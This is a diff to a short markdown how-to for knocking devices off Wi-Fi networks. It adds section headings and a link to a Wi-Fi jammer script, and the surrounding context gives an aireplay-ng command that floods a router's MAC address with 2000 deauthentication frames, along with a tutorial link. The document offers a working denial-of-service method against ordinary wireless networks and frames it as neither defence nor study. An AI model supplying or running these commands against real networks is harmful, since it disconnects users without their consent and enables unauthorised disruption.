@@ -1,3 +1,5 @@
+## Method 1 - Airplay-ng
+
 Tutorial https://www.youtube.com/watch?v=RdVIlMABYVc
 
 ```
@@ -10,3 +12,10 @@ aireplay-ng --deauth 2000 -a xx:xx:xx:xx:xx:xx wlan0mon
 ```
 
 xx:xx:xx:xx:xx:xx is MAC address of the router
+
+
+## Method 2 - Wifijammer Script
+
+https://github.com/DanMcInerney/wifijammer
+
+Article https://en.kali.tools/?p=394
